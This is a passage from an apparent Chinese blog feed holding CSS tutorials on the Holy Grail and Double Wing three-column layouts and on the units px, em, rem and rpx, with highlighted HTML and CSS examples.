class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.footer &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.middle &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.left &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: yellow;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.right &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: pink</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-我们首先给middle-left-right三个盒子加上浮动"><a href="#2-我们首先给middle-left-right三个盒子加上浮动" class="headerlink" title="2.我们首先给middle,left,right三个盒子加上浮动"></a>2.我们首先给middle,left,right三个盒子加上浮动</h3><p><code>float:left</code></p><p>出现了高度塌陷给content加上<code>overflow:hidden</code></p><h3 id="3-这里先介绍一下margin-left"><a href="#3-这里先介绍一下margin-left" class="headerlink" title="3.这里先介绍一下margin-left"></a>3.这里先介绍一下margin-left</h3><p>当margin-left的值为%时，数值基于父对象的百分比左外边距。  </p><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p><h3 id="3-最后用相对定位调整位置"><a href="#3-最后用相对定位调整位置" class="headerlink" title="3.最后用相对定位调整位置"></a>3.最后用相对定位调整位置</h3><p>给黄色盒子加上<code>position:relative;right:100px</code></p><p>给粉色盒子加上<code>position:relative;left:100px</code></p><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        .header &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.content &#123;</span></span><br><span class="line"><span class="undefined">overflow: hidden;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.footer &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.middle &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">         .inner-middle&#123;</span></span><br><span class="line"><span class="undefined">width:100%;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.left &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">margin-left: -100%;</span></span><br><span class="line"><span class="undefined">background: yellow;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.right &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">margin-left: -100px;</span></span><br><span class="line"><span class="undefined">background: pink</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner-middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-初始状态"><a href="#1-初始状态" class="headerlink" title="1.初始状态"></a>1.初始状态</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner-middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-给left-right-middle加浮动"><a href="#2-给left-right-middle加浮动" class="headerlink" title="2.给left,right,middle加浮动"></a>2.给left,right,middle加浮动</h3><h3 id="3-margin-left调整位置"><a href="#3-margin-left调整位置" class="headerlink" title="3.margin-left调整位置"></a>3.margin-left调整位置</h3><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p>]]></content>
      
      
      <categories>
          
          <category> 整理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>圣杯布局和双飞翼布局</title>
      <link href="2018/09/18/%E6%95%B4%E7%90%86-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/"/>
      <url>2018/09/18/%E6%95%B4%E7%90%86-%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>圣杯布局跟双飞翼布局的实现，目的都是左右两栏固定宽度，中间部分自适应。<br>中间栏放在最前面优先渲染。 </p><a id="more"></a><h2 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h2><h3 id="1-这是初始状态，我们来构造圣杯布局"><a href="#1-这是初始状态，我们来构造圣杯布局" class="headerlink" title="1.这是初始状态，我们来构造圣杯布局"></a>1.这是初始状态，我们来构造圣杯布局</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">padding</span>: 0 100<span class="selector-tag">px</span>;<span class="comment">/*左右各留出100px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.footer</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: yellow;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: pink</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-我们首先给middle-left-right三个盒子加上浮动"><a href="#2-我们首先给middle-left-right三个盒子加上浮动" class="headerlink" title="2.我们首先给middle,left,right三个盒子加上浮动"></a>2.我们首先给middle,left,right三个盒子加上浮动</h3><p><code>float:left</code></p><p>出现了高度塌陷给content加上<code>overflow:hidden</code></p><h3 id="3-这里先介绍一下margin-left"><a href="#3-这里先介绍一下margin-left" class="headerlink" title="3.这里先介绍一下margin-left"></a>3.这里先介绍一下margin-left</h3><p>当margin-left的值为%时，数值基于父对象的百分比左外边距。  </p><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p><h3 id="3-最后用相对定位调整位置"><a href="#3-最后用相对定位调整位置" class="headerlink" title="3.最后用相对定位调整位置"></a>3.最后用相对定位调整位置</h3><p>给黄色盒子加上<code>position:relative;right:100px</code></p><p>给粉色盒子加上<code>position:relative;left:100px</code></p><h2 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.header</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="undefined">overflow: hidden;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.footer</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.middle</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">         <span class="selector-class">.inner-middle</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">width</span><span class="selector-pseudo">:100</span>%;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">background: green;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">margin-left: -100%;</span></span><br><span class="line"><span class="undefined">background: yellow;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">width: 100px;</span></span><br><span class="line"><span class="undefined">float: left;</span></span><br><span class="line"><span class="undefined">height: 80px;</span></span><br><span class="line"><span class="undefined">margin-left: -100px;</span></span><br><span class="line"><span class="undefined">background: pink</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner-middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-初始状态"><a href="#1-初始状态" class="headerlink" title="1.初始状态"></a>1.初始状态</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"middle"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner-middle"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-给left-right-middle加浮动"><a href="#2-给left-right-middle加浮动" class="headerlink" title="2.给left,right,middle加浮动"></a>2.给left,right,middle加浮动</h3><h3 id="3-margin-left调整位置"><a href="#3-margin-left调整位置" class="headerlink" title="3.margin-left调整位置"></a>3.margin-left调整位置</h3><p>给黄色盒子加上<code>margin-left:-100%</code></p><p>给粉色盒子加上<code>margin-left:-100px</code>  </p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>rem、px、em、rpx、vw、vh</title>
      <link href="2018/09/17/%E6%95%B4%E7%90%86-rem%E3%80%81px%E3%80%81em%E3%80%81rpx%E3%80%81vw%E3%80%81vh/"/>
      <url>2018/09/17/%E6%95%B4%E7%90%86-rem%E3%80%81px%E3%80%81em%E3%80%81rpx%E3%80%81vw%E3%80%81vh/</url>
      
        <content type="html"><![CDATA[<h3 id="1-px"><a href="#1-px" class="headerlink" title="1.px"></a>1.px</h3><p>在Web页面初期制作中，我们都是使用“px”来设置我们的文本，因为他比较稳定和精确。但是这种方法存在一个问题，当用户在浏览器中浏览我们制作的Web页面时，他改变了浏览器的字体大小，这时会使用我们的Web页面布局被打破。 于是就有了em</p><a id="more"></a><h3 id="2-em"><a href="#2-em" class="headerlink" title="2.em"></a>2.em</h3><p>em是相对长度单位。它的单位长度是根据元素的文本垂直长度来决定的。可以作用在width、height、line-height、margin、padding、border等样式的设置上。 如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。 默认1em=16px。如果在body选择器中声明font-size=62.5%,则1em=10px。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.parent</span>&#123; </span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:5em</span>; <span class="comment">/*80px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:10em</span>;<span class="comment">/*800px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-class">.child</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">font-size</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*160px*/</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">height</span><span class="selector-pseudo">:2em</span>;<span class="comment">/*320px*/</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在不设置元素font-size的情况下，em总是根据父元素的font-size来确定长度；即使元素设置了font-size，多次嵌套使用em也往往会造成疏忽，不仅使用前需要大量计算，而且不能保证没有漏网之鱼。这将是一个繁杂而低效率的工作。 于是有了rem.</p><h3 id="3-rem"><a href="#3-rem" class="headerlink" title="3.rem"></a>3.rem</h3><p>rem不是依据父元素——而是依据根元素（root element）来确定其长度。 </p><p>我们一般给根元素设置一个容易计算的font-size</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    html &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 62<span class="selector-class">.5</span>%;   <span class="comment">/* 10px */</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    div &#123;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">font-size</span>: 2<span class="selector-class">.4rem</span>;  <span class="comment">/* 24px */</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">width</span>: 64<span class="selector-tag">rem</span>;   <span class="comment">/* 640px */</span></span></span><br><span class="line"><span class="css">        <span class="selector-tag">border</span>: 0<span class="selector-class">.1rem</span> <span class="selector-tag">solid</span> <span class="selector-id">#ccc</span>;  <span class="comment">/* 1px */</span></span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div2"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-rpx"><a href="#4-rpx" class="headerlink" title="4.rpx"></a>4.rpx</h3><table><thead><tr><th style="text-align:left">设备</th><th style="text-align:left">rpx换算px (屏幕宽度/750)</th><th style="text-align:left">px换算rpx (750/屏幕宽度)</th></tr></thead><tbody><tr><td style="text-align:left">iPhone5</td><td style="text-align:left">1rpx = 0.42px</td><td style="text-align:left">1px = 2.34rpx</td></tr><tr><td style="text-align:left">iPhone6</td><td style="text-align:left">1rpx = 